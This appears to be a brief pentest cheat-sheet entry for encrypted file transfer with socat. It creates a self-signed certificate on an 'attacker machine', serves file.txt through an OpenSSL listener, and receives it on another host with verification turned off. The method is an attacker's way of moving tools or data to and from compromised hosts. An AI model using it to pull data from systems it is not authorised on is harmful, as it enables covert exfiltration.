## socat: encrypted file transfer
### step #1: on attacker machine, generate a create a key and a certificate associated with it.
```bash
openssl req -newkey rsa:2048 -nodes -keyout socat.key -x509 -days 1000 -out socat.crt
```
### step #2: on attacker machine,create a pem file from the key and crt files
```bash
cat socat.key socat.crt > socat.pem
```
### step #3: on machine hosting the file:
```bash
socat -d -d OPENSSL-LISTEN:<LPORT>,cert=socat.pem,verify=0,reuseaddr,fork file:file.txt
```
## #step #4: on machine receiving the file:
```bash
socat OPENSSL:<LHOST>:<LPORT>,verify=0 file:file.txt,create
```